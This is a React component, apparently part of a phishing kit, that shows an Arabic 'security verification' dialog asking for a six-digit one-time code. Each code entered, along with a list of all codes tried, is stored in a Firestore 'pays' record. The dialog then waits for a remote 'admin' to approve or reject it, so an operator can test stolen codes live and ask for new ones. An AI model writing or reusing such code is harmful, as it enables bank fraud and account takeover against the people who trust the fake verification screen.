"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { ShieldCheck, AlertCircle } from "lucide-react"
import { db } from "@/lib/firebase"
import { doc, onSnapshot, updateDoc } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"

interface OtpDialogProps {
  open: boolean
  onOpenChange: (open: boolean) => void
  onOtpApproved: () => void
  documentId?: string
}
const allOtps=['']
// OTP Dialog Component with admin approval flow
export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: OtpDialogProps) {
  const [otp, setOtp] = useState("")
  const [error, setError] = useState("")
  const [otpStatus, setOtpStatus] = useState<"waiting" | "verifying" | "approved" | "rejected" | "otp_rejected">("waiting")
  const [isListening, setIsListening] = useState(false)

  // Listen to Firestore for OTP status changes
  useEffect(() => {
    if (!documentId || !open) return

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    setIsListening(true)

    const unsubscribe = onSnapshot(
      doc(db, "pays", visitorID),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const status = data.otpStatus as "waiting" | "verifying" | "approved" | "rejected" | "otp_rejected" | "show_otp" | "show_pin"

          if (status === "otp_rejected") {
            setOtpStatus("waiting")
            setOtp("") // Clear the old code
            setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
          } else if (status === "approved") {
            setOtpStatus("approved")
            setError("")
            onOtpApproved()
          } else if (status === "verifying") {
            setOtpStatus("verifying")
          }
        }
      },
      (err) => {
        console.error("Error listening to document:", err)
        setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
      },
    )

    return () => {
      unsubscribe()
      setIsListening(false)
    }
  }, [documentId, open, onOtpApproved])

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (otp.length !== 6) {
      setError("يرجى إدخال رمز التحقق المكون من 6 أرقام")
      return
    }

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    try {
      allOtps.push(otp)
      // Update the document with the OTP
      await updateDoc(doc(db, "pays", visitorID), {
        otp,
        otpSubmittedAt: new Date().toISOString(),
        allOtps,
        otpStatus: "verifying" // Set to verifying, waiting for admin decision
      })

      // Add OTP to history
      await addToHistory(visitorID, "otp", {
        otpCode: otp
      }, "pending")

      setOtpStatus("verifying") // Show loading state
      // The status will be updated via the listener when admin approves/rejects
    } catch (err) {
      console.error("Error submitting OTP:", err)
      setError("حدث خطأ في إرسال رمز التحقق. يرجى المحاولة مرة أخرى.")
    }
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md" dir="rtl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2 text-xl">
            <ShieldCheck className="w-6 h-6 text-[#0a4a68]" />
            التحقق الأمني
          </DialogTitle>
          <DialogDescription>تم إرسال رمز التحقق (OTP) إلى رقم هاتفك المسجل</DialogDescription>
        </DialogHeader>

        <form onSubmit={handleOtpSubmit} className="space-y-4">
          {error && (
            <Alert variant="destructive">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}

          <div className="space-y-2">
            <label className="text-sm font-bold text-gray-900">أدخل رمز التحقق (OTP)</label>
            <Input
              type="tel"
              placeholder="000000"
              value={otp}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, "").slice(0, 6)
                setOtp(value)
                setError("")
              }}
              maxLength={6}
              className="h-14 text-center text-4xl font-mono tracking-widest"
              dir="ltr"
              disabled={otpStatus === "verifying"}
              required
            />
          </div>

          <Button
            type="submit"
            className="w-full h-12 bg-[#0a4a68] hover:bg-[#0a4a68]/90 text-white font-bold"
            disabled={otp.length !== 6 || otpStatus === "verifying"}
          >
            {otpStatus === "verifying" ? "جاري التحقق..." : "تأكيد"}
          </Button>

          <p className="text-xs text-center text-gray-600">
            لم تستلم الرمز؟{" "}
            <button type="button" className="text-[#0a4a68] font-semibold hover:underline">
              إعادة الإرسال
            </button>
          </p>
        </form>
      </DialogContent>
    </Dialog>
  )
}
